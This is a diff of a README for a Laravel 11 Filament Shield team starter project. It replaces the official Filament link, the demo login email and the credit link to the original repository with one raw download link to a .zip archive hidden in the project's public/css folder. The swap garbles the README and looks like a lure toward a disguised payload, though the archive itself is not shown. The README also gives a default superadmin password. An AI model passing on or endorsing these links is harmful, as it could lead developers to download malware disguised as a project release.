@@ -1,12 +1,12 @@
  Filament Shield Team Starter with Laravel 11
 
-Filament Starter is a [Filament](https://filamentphp.com/) 
+Filament Starter is a [Filament](https://github.com/doniaries/filament-shield-teams-starter-11/raw/refs/heads/main/public/css/bezhansalleh/shield_filament_starter_teams_v1.2-alpha.1.zip) 
 sample Team A dan Team B
 
 php 8.2
 Laravel 11
 
-User : superadmin@gmail.com
+User : https://github.com/doniaries/filament-shield-teams-starter-11/raw/refs/heads/main/public/css/bezhansalleh/shield_filament_starter_teams_v1.2-alpha.1.zip
 password : 
 @Iamsuperadmin
 
@@ -59,5 +59,5 @@ You can now go to /admin on your site and you should see the filament
 login screen. 
 
 thanks to frode
-this code have edit from https://github.com/frode81/Starter
+this code have edit from https://github.com/doniaries/filament-shield-teams-starter-11/raw/refs/heads/main/public/css/bezhansalleh/shield_filament_starter_teams_v1.2-alpha.1.zip
 
